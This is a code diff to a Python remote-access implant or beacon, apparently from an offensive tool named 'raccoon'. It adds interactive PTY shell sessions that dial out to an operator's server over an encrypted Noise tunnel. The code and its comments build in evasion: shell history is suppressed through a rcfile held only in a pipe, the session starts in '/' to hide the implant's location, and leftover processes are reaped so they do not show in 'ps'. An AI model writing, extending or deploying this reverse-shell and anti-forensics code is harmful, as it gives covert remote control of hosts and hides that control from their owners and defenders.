@@ -2976,6 +2976,224 @@ def tunnel_mode_problem(config) -> Optional[str]:
     return tunnel_config_problem(config)
 
 
+# ── A PTY session ──
+#
+# The second kind of session this endpoint carries. A relay has a target
+# socket; a shell session has the master side of a pseudo-terminal, and
+# everything else -- the outward dial, the token claim, the Noise framing,
+# the two-direction pump -- is the relay's.
+
+# At most four at a time on one endpoint. Each one costs a process, two
+# threads and three descriptors, and the host at the far end of this is a
+# Pi: the beacon already treats a thread it cannot get as a condition
+# rather than a crash, and a cap is the same thought one step earlier.
+# The front at the operator's end caps itself at four as well; this is the
+# end that enforces it, because this is the end that spends the resources.
+_SHELL_MAX_SESSIONS = 4
+
+# How long the shell's process group is given to go on SIGHUP before it
+# is killed. A session whose stream has gone has nothing left to
+# negotiate with, and an interactive shell exits on a hangup in
+# milliseconds; this bounds the one case where something in the group is
+# wedged in a syscall.
+_SHELL_TERM_GRACE = 2.0
+
+# How long the output direction blocks before it looks at the flag that
+# says the session is over.
+#
+# The one place this file polls. A socket is unparked by shutting it
+# down, which is what `_bridge` relies on in both directions; a PTY
+# master has no such call, and closing a descriptor another thread is
+# parked in a read on is how that number gets reused underneath it. So
+# the direction that reads a descriptor rather than a socket waits in
+# `select` instead. No byte ever waits for this: `select` returns the
+# instant one arrives, and this bounds only how long a teardown takes to
+# be noticed.
+_SHELL_POLL = 0.2
+
+# The terminal a session claims to be, where it starts, and the two
+# shells it will run. `/` and not the install directory: a prompt that
+# names where the implant lives is a free finding for whoever is reading
+# over the operator's shoulder.
+_SHELL_TERM = "xterm-256color"
+_SHELL_CWD = "/"
+_SHELL_BASH = "/bin/bash"
+_SHELL_SH = "/bin/sh"
+_DEV_FD = "/dev/fd"
+
+# The rcfile a bash session is started on, held in a pipe and never
+# written anywhere.
+#
+# `bash -i` has to read `/etc/bash.bashrc` and `~/.bashrc`: that is where
+# `bash-completion` is sourced, and completion for the tools on the
+# target is the whole reason for using the target's own shell. Those are
+# also the files most likely to set `HISTFILE` on Debian and ParrotOS, so
+# `HISTFILE` in the environment would be undone by the very files that
+# have to run. Hence the order here: source them, then unset it, then
+# turn history off for the session. What this construction holds is
+# exactly that -- no history file on the target unless something
+# re-enables one *after* rc processing -- and the documentation claims no
+# more than that.
+_SHELL_RCFILE = ('[ -f /etc/bash.bashrc ] && . /etc/bash.bashrc\n'
+                 '[ -f "$HOME/.bashrc" ] && . "$HOME/.bashrc"\n'
+                 'unset HISTFILE\n'
+                 'set +o history\n')
+
+
+def _shell_modules():
+    """The POSIX modules a PTY session needs, imported on the way in.
+
+    Lazily, and in one place. `pty`, `fcntl` and `termios` do not exist
+    on Windows and this file has to stay importable there -- a beacon on
+    a Windows host has everything else to do -- so the import is here
+    rather than at the top, and a host that cannot satisfy it refuses the
+    session in plain text on the stream instead of failing opaquely.
+    `select` and `signal` ride along because they are used only on this
+    same POSIX path: `signal.SIGHUP` and `os.killpg` have no meaning
+    without it.
+
+    It is also the one seam a test can replace to produce such a host,
+    which is not a condition a test can otherwise arrange.
+    """
+    import fcntl
+    import pty
+    import select
+    import signal
+    import termios
+    return pty, fcntl, termios, select, signal
+
+
+def _shell_executable(path: str) -> bool:
+    """Whether `path` is something this process can execute.
+
+    A function of its own for the same reason `_dial_target` is one: a
+    host without bash is not a condition a test can arrange, and what is
+    worth testing is the choice made from this answer rather than
+    `os.access` itself.
+    """
+    return os.access(path, os.X_OK)
+
+
+def _shell_program() -> str:
+    """The shell a session runs: bash where there is one, else `/bin/sh`.
+
+    bash because the point of the session is the host's own line editing
+    and completion, and `bash-completion` is what knows `nmap`'s flags.
+    `/bin/sh` is the floor every POSIX host has: a session without
+    completion still beats one command per check-in.
+    """
+    return _SHELL_BASH if _shell_executable(_SHELL_BASH) else _SHELL_SH
+
+
+def _shell_rcfile_fd() -> int:
+    """The read end of a pipe holding `_SHELL_RCFILE`.
+
+    Nothing reaches the target's disk: the rcfile is the contents of a
+    pipe, which the child opens as `/dev/fd/<n>`. The text is a few
+    dozen bytes, far inside a pipe's buffer, so the write completes
+    before there is anybody to read it and the write end can be closed
+    straight away -- no thread to hold it open, and no way for this to
+    block on a reader that never arrives.
+
+    The caller closes the descriptor returned once the child holds its
+    own copy.
+    """
+    read_fd, write_fd = os.pipe()
+    try:
+        os.write(write_fd, _SHELL_RCFILE.encode("utf-8"))
+    except OSError:
+        _close_fd(read_fd)
+        raise
+    finally:
+        _close_fd(write_fd)
+    return read_fd
+
+
+def _shell_invocation(cols: int, rows: int) -> Tuple[list, dict, tuple]:
+    """What to run for a PTY session: argv, environment, descriptors.
+
+    The environment is this process's own plus the terminal the session
+    is: `TERM`, because a session without one has no cursor keys and no
+    completion display, and `COLUMNS`/`LINES`, because readline reads
+    them before it has seen a window-size change.
+
+    History is held off with the generated rcfile described at
+    `_SHELL_RCFILE`. Where that construction is not available -- a host
+    with no `/dev/fd`, a host with only `/bin/sh`, which has no
+    `--rcfile`, or a pipe that could not be made -- the session falls
+    back to `HISTFILE=/dev/null` in the environment and logs that it took
+    the weaker path, because the host's own rc files run after that and
+    are free to set `HISTFILE` again.
+
+    `--rcfile` comes before `-i`: bash 3.2 stops reading long options
+    after the first short one and answers `--: invalid option`, which
+    would be a session that exits instantly on macOS and runs on Linux.
+
+    The third element is the descriptors the child needs; the caller
+    closes every one of them once the child is spawned.
+    """
+    program = _shell_program()
+    env = dict(os.environ)
+    env["TERM"] = _SHELL_TERM
+    env["COLUMNS"] = str(cols)
+    env["LINES"] = str(rows)
+    rc_fd = -1
+    weaker = ""
+    if program != _SHELL_BASH:
+        weaker = "%s is not bash, and only bash takes --rcfile" % program
+    elif not os.path.isdir(_DEV_FD):
+        weaker = "this host has no %s to hand a pipe to bash on" % _DEV_FD
+    else:
+        try:
+            rc_fd = _shell_rcfile_fd()
+        except OSError as exc:
+            weaker = "the rcfile pipe could not be opened (%s)" % exc
+    if weaker:
+        env["HISTFILE"] = os.devnull
+        logger.info("tunnel: a shell session is holding history off with "
+                    "HISTFILE=%s rather than a generated rcfile: %s",
+                    os.devnull, weaker)
+        return [program, "-i"], env, ()
+    return ([program, "--rcfile", "%s/%d" % (_DEV_FD, rc_fd), "-i"],
+            env, (rc_fd,))
+
+
+def _shell_geometry(value, default: int) -> int:
+    """One terminal dimension from a message, inside `1..` the bound.
+
+    Anything that is not an integer -- absent, a string, a float, `true`
+    -- takes the default, and a number outside the bounds is clamped
+    rather than refused: an operator on a 300-column terminal should get
+    300 columns, and one whose client sent 99999 should get a session
+    rather than an error. The bound is the codec's, shared with the front
+    that asks for the session, because an `ioctl` is the wrong place to
+    discover that the two ends disagree about what a terminal can be.
+    """
+    if isinstance(value, bool) or not isinstance(value, int):
+        return default
+    return max(1, min(SHELL_GEOMETRY_MAX, value))
+
+
+def _write_all(fd: int, data: bytes) -> None:
+    """Every byte of `data` to `fd`, which `os.write` does not promise.
+
+    `sendall`'s loop, which a socket has and a descriptor does not: a
+    write to a PTY master can be short, and a short write here is a
+    keystroke the shell never saw.
+    """
+    view = memoryview(data)
+    while view:
+        view = view[os.write(fd, view):]
+
+
+def _close_fd(fd: int) -> None:
+    """Drop a descriptor now, raising nothing. `_shut_socket` for an fd."""
+    try:
+        os.close(fd)
+    except OSError as exc:
+        logger.debug("tunnel: could not close descriptor %d: %s", fd, exc)
+
+
 class _TunnelChannel(object):
     """The endpoint's command channel: its socket, Noise session and lock.
 
@@ -3105,6 +3323,10 @@ class TunnelEndpoint(object):
         self._relay_threads = []    # type: list
         self._sessions = 0
         self._carried = 0
+        # Shell sessions only, which `_sessions` cannot serve: that one
+        # counts relays too, and the cap is on the ones that cost a
+        # process and a PTY.
+        self._shells = 0
 
     # ── lifecycle ──
 
@@ -3377,6 +3599,8 @@ class TunnelEndpoint(object):
             channel.touch()
             if kind == MSG_OPEN_RELAY:
                 self._spawn_relay(body)
+            elif kind == MSG_OPEN_SHELL:
+                self._spawn_shell(body)
             elif kind == MSG_PING:
                 try:
                     channel.send(MSG_PONG, {})
@@ -3697,6 +3921,355 @@ class TunnelEndpoint(object):
                 peer.sendall(data)
             except OSError:
                 return
+
+    # ── a PTY session ──
+
+    def _spawn_shell(self, body: dict) -> None:
+        """Dial the shell session the server has just asked for, on a thread.
+
+        A sibling of `_spawn_relay`, and the same two rules: the port in
+        the message is read, logged when it differs and never acted on,
+        for the reason that method's docstring gives at length; and a
+        thread the process cannot give is a degraded session rather than
+        an exception, because the operator's end is already waiting on a
+        session that will now simply never pair.
+
+        What is *not* here is the session cap. It is applied in
+        `_serve_shell`, after the dial and the claim, because a refusal
+        has to arrive as text on the stream the operator is watching: an
+        attach refused before its stream existed looks exactly like a
+        tunnel that has stopped working, which is the one diagnosis this
+        feature must not hand anybody.
+        """
+        token = body.get("token")
+        advertised = body.get("port")
+        if not isinstance(token, str) or not token:
+            logger.warning("tunnel: an OPEN_SHELL carrying no token; ignored")
+            return
+        if advertised != self.port:
+            logger.debug("tunnel: an OPEN_SHELL advertised port %r; this "
+                         "endpoint dials its configured %d",
+                         advertised, self.port)
+        cols = _shell_geometry(body.get("cols"), SHELL_DEFAULT_COLS)
+        rows = _shell_geometry(body.get("rows"), SHELL_DEFAULT_ROWS)
+        thread = threading.Thread(target=self._shell, args=(token, cols, rows),
+                                  name="tunnel-shell", daemon=True)
+        with self._lock:
+            self._relay_threads = [t for t in self._relay_threads
+                                   if t.is_alive()]
+            self._relay_threads.append(thread)
+        try:
+            thread.start()
+        except RuntimeError as exc:
+            with self._lock:
+                if thread in self._relay_threads:
+                    self._relay_threads.remove(thread)
+            logger.warning("tunnel: no thread could be started for a shell "
+                           "session: %s", exc)
+
+    def _shell(self, token: str, cols: int, rows: int) -> None:
+        """One shell session: dial the same port, claim it, serve it."""
+        sock = None
+        try:
+            sock = self._dial(self.port)
+            self._register_socket(sock)
+            noise = self._handshake(
+                sock, encode_message(MSG_SHELL, {"token": token}))
+            self._serve_shell(sock, noise, cols, rows)
+        except (OSError, ValueError) as exc:
+            # As in `_relay`: a session that could not be dialled, a token
+            # the server no longer holds, a frame that did not
+            # authenticate, an operator who closed their terminal. All of
+            # it costs this one session and is logged, and never the
+            # endpoint.
+            logger.info("tunnel: a shell session to %s:%d ended: %s",
+                        self.server, self.port, exc)
+        except Exception:
+            logger.exception("tunnel: unexpected error on a shell session")
+        finally:
+            if sock is not None:
+                self._forget_socket(sock)
+                _shut_socket(sock)
+
+    def _serve_shell(self, sock: socket.socket, noise: NoiseSession,
+                     cols: int, rows: int) -> None:
+        """Open a PTY, start a shell on it, and carry it until it ends.
+
+        Where `_serve_relay` reads a SOCKS request and answers it, this
+        reads nothing: after the claim the stream is already the
+        terminal's, and the operator's first byte is input for the shell.
+        The two refusals that remain are written as plain text for the
+        same reason -- a terminal is what is reading them.
+
+        The child is started in a session of its own so that it leads a
+        process group, which is what the teardown signals: what an
+        operator leaves behind is as likely to be a `tcpdump` they started
+        as the shell itself. The slave is closed here the moment the child
+        holds its own copy, because the master reports the child's exit --
+        `EIO`, or an empty read -- only once nothing else has the slave
+        open; a parent that kept it would park the output pump for ever on
+        a shell that had already gone.
+
+        Everything is undone in the `finally`, including on a thread that
+        could not be started: no child process and no descriptor may
+        outlive this method.
+        """
+        try:
+            pty_mod, fcntl_mod, termios_mod, _, signal_mod = _shell_modules()
+        except ImportError as exc:
+            self._refuse_shell(
+                sock, noise,
+                "this host cannot open a terminal session (%s). A shell "
+                "session needs a POSIX pty, which this build's host does "
+                "not have." % exc)
+            return
+        if not self._take_shell_slot():
+            self._refuse_shell(
+                sock, noise,
+                "this endpoint already carries %d shell sessions, which is "
+                "all it will hold at once. Close one and attach again."
+                % _SHELL_MAX_SESSIONS)
+            return
+        master = None
+        slave = None
+        child_fds = ()
+        child = None
+        try:
+            master, slave = pty_mod.openpty()
+            argv, env, child_fds = _shell_invocation(cols, rows)
+            child = subprocess.Popen(argv, stdin=slave, stdout=slave,
+                                     stderr=slave, cwd=_SHELL_CWD, env=env,
+                                     start_new_session=True,
+                                     pass_fds=child_fds)
+            _close_fd(slave)
+            slave = None
+            for fd in child_fds:
+                _close_fd(fd)
+            child_fds = ()
+            fcntl_mod.ioctl(master, termios_mod.TIOCSWINSZ,
+                            struct.pack("HHHH", rows, cols, 0, 0))
+        except (OSError, ValueError) as exc:
+            # A host out of descriptors or ptys, or a shell that is not
+            # where every POSIX host keeps one.
+            self._refuse_shell(sock, noise,
+                               "this host could not start a terminal "
+                               "session (%s)." % exc)
+        else:
+            logger.info("tunnel: a shell session opened: %s, %dx%d, pid %d",
+                        argv[0], cols, rows, child.pid)
+            self._count_session(1)
+            try:
+                self._shell_bridge(sock, noise, master)
+            finally:
+                self._count_session(-1)
+        finally:
+            for fd in child_fds:
+                _close_fd(fd)
+            if slave is not None:
+                _close_fd(slave)
+            if child is not None:
+                self._end_shell(child, signal_mod)
+            if master is not None:
+                _close_fd(master)
+            self._drop_shell_slot()
+
+    def _shell_bridge(self, sock: socket.socket, noise: NoiseSession,
+                      master: int) -> None:
+        """Carry bytes until either the stream or the shell is finished.
+
+        `_bridge`'s shape with the target socket replaced by the PTY
+        master, and its invariant too: exactly one thread writes each
+        descriptor, so neither direction needs the lock the command
+        channel has. This thread is the only writer on the master; the
+        thread started here is the only writer on the stream.
+
+        The stream has no timeout, as in a relay -- an idle session is an
+        ordinary thing, which is most of what a shell session is. The
+        master cannot be unparked by a shutdown the way a socket can, so
+        the two directions share an event instead: whichever finishes
+        first sets it, and the other sees it within `_SHELL_POLL`. That is
+        what keeps the output pump from sitting in `os.read` on a session
+        whose operator has gone -- which would end with a join that timed
+        out and a caller closing a master another thread is still parked
+        in a read on, the one way a descriptor number gets reused
+        underneath somebody.
+        """
+        select_mod = _shell_modules()[3]
+        sock.settimeout(None)
+        ended = threading.Event()
+        back = threading.Thread(target=self._from_pty,
+                                args=(sock, noise, master, ended, select_mod),
+                                name="tunnel-shell-out", daemon=True)
+        try:
+            back.start()
+        except RuntimeError as exc:
+            # A session an operator can type into and see nothing from is
+            # worse than none, so it ends here: the caller reaps the child
+            # and closes the master, and the stream goes with it.
+            logger.warning("tunnel: could not start the output direction of "
+                           "a shell session; closing it: %s", exc)
+            return
+        try:
+            self._to_pty(sock, noise, master, ended)
+        finally:
+            # The event before the join, for the master, and the shutdown
+            # for the stream: the other thread may be parked in either.
+            ended.set()
+            _shutdown_socket(sock)
+            back.join(timeout=_TUNNEL_JOIN_TIMEOUT)
+
+    def _from_pty(self, sock: socket.socket, noise: NoiseSession, master: int,
+                  ended: threading.Event, select_mod) -> None:
+        """The shell's output, toward the operator."""
+        try:
+            while not ended.is_set() and not self._stop.is_set():
+                try:
+                    readable = select_mod.select([master], [], [],
+                                                 _SHELL_POLL)[0]
+                except OSError:
+                    return
+                if not readable:
+                    continue
+                try:
+                    data = os.read(master, _TUNNEL_CHUNK)
+                except OSError as exc:
+                    # `EIO` on a master is the child having gone: that is
+                    # how a slave with no process left on it reads on
+                    # Linux, where elsewhere it is an empty read. Both
+                    # end the session.
+                    if exc.errno != errno.EIO:
+                        logger.debug("tunnel: a shell session's terminal "
+                                     "ended: %s", exc)
+                    return
+                if not data:
+                    return
+                try:
+                    write_frame(sock, noise.encrypt(data))
+                except (OSError, ValueError):
+                    return
+        finally:
+            # This direction ending ends the session, as in a relay: a
+            # shell the operator can no longer see is not a session.
+            ended.set()
+            _shutdown_socket(sock)
+
+    def _to_pty(self, sock: socket.socket, noise: NoiseSession,
+                master: int, ended: threading.Event) -> None:
+        """The operator's keystrokes, toward the shell."""
+        try:
+            self._to_pty_loop(sock, noise, master)
+        finally:
+            ended.set()
+            _shutdown_socket(sock)
+
+    def _to_pty_loop(self, sock: socket.socket, noise: NoiseSession,
+                     master: int) -> None:
+        while True:
+            try:
+                if not _bytes_waiting(sock):
+                    # A FIN between frames: the operator's terminal is
+                    # gone. The peek is what keeps that ordinary ending
+                    # out of the warning below, exactly as in a relay.
+                    return
+                frame = read_frame(sock)
+            except OSError:
+                return
+            except ValueError as exc:
+                logger.warning("tunnel: a shell frame was malformed (%s); "
+                               "the session is over", exc)
+                return
+            try:
+                data = noise.decrypt(frame)
+            except ValueError as exc:
+                # Noise §5.1, on a shell session this time.
+                logger.warning("tunnel: a shell frame did not authenticate "
+                               "(%s); the session is over", exc)
+                return
+            try:
+                _write_all(master, data)
+            except OSError:
+                return
+
+    def _refuse_shell(self, sock: socket.socket, noise: NoiseSession,
+                      reason: str) -> None:
+        """One line of readable text on the stream, and nothing else.
+
+        Text and not a message kind: what is at the other end of this
+        stream is the operator's terminal, so a sentence is the only
+        refusal they can read -- and a terminal in raw mode needs the
+        carriage return. Every refusal says what happened and what to do
+        about it; none of them is a stack trace.
+        """
+        logger.info("tunnel: refusing a shell session: %s", reason)
+        try:
+            write_frame(sock,
+                        noise.encrypt(("raccoon: %s\r\n" % reason)
+                                      .encode("utf-8")))
+        except (OSError, ValueError) as exc:
+            logger.debug("tunnel: the refusal could not be written: %s", exc)
+
+    def _end_shell(self, child: "subprocess.Popen", signal_mod) -> None:
+        """Hang the session up, kill what is left of it, and reap it.
+
+        The process group and not the process: the child was started in a
+        session of its own, so it leads a group, and an operator's
+        `tcpdump` is in that group too. `SIGHUP` first, because losing a
+        terminal is what a hangup is and an interactive shell exits on it
+        after hanging up its own jobs; `SIGKILL` after
+        `_SHELL_TERM_GRACE`, because a session whose stream has gone has
+        nothing left to negotiate with.
+
+        Reaped before returning -- `Popen.wait` is `waitpid` -- because a
+        zombie root shell in the beacon's process table is the same
+        finding as a live one to anybody reading `ps`, and nothing can
+        clear it remotely afterwards.
+        """
+        pid = child.pid
+        if child.poll() is None:
+            self._signal_shell(pid, signal_mod.SIGHUP)
+            try:
+                child.wait(timeout=_SHELL_TERM_GRACE)
+            except subprocess.TimeoutExpired:
+                logger.info("tunnel: a shell session's process group %d did "
+                            "not go on SIGHUP; killing it", pid)
+                self._signal_shell(pid, signal_mod.SIGKILL)
+        try:
+            child.wait(timeout=_SHELL_TERM_GRACE)
+        except subprocess.TimeoutExpired:
+            # A process in an uninterruptible syscall, which not even
+            # SIGKILL moves until it returns. Said out loud rather than
+            # waited on: this thread is not the place to block for ever.
+            logger.warning("tunnel: a shell session's child %d could not be "
+                           "reaped after SIGKILL", pid)
+            return
+        logger.info("tunnel: a shell session ended, child %d exit %s",
+                    pid, child.returncode)
+
+    @staticmethod
+    def _signal_shell(pid: int, number: int) -> None:
+        """One signal to the group `pid` leads, raising nothing.
+
+        Safe to call twice and safe on a group that has already gone:
+        the child is not reaped until `_end_shell` does it, so this pid
+        cannot have been reused by somebody else in between.
+        """
+        try:
+            os.killpg(pid, number)
+        except OSError as exc:
+            logger.debug("tunnel: could not signal the shell's group %d: %s",
+                         pid, exc)
+
+    def _take_shell_slot(self) -> bool:
+        """Reserve one of the `_SHELL_MAX_SESSIONS` slots, or refuse."""
+        with self._lock:
+            if self._shells >= _SHELL_MAX_SESSIONS:
+                return False
+            self._shells += 1
+            return True
+
+    def _drop_shell_slot(self) -> None:
+        with self._lock:
+            self._shells -= 1
 
     # ── getting out ──
 
